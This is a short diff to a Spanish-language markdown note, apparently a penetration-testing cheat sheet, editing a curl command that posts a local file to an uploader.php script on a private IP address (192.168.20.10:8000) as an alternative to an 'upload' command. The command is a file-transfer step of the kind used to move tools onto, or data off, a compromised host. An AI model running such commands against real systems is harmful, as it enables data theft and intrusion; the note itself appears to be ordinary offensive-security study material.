@@ -127,8 +127,7 @@ upload <archivo_local> <nombre_remoto>
 o utilizando `curl`
 
 ```bash
-curl -F "file=@archivo.exe" \
-http://192.168.20.10:8000/path/uploader.php
+curl -F "file=@/ruta/de/tu/archivo/local" http://192.168.20.10:8000/path/uploader.php
 ```
 
 ---
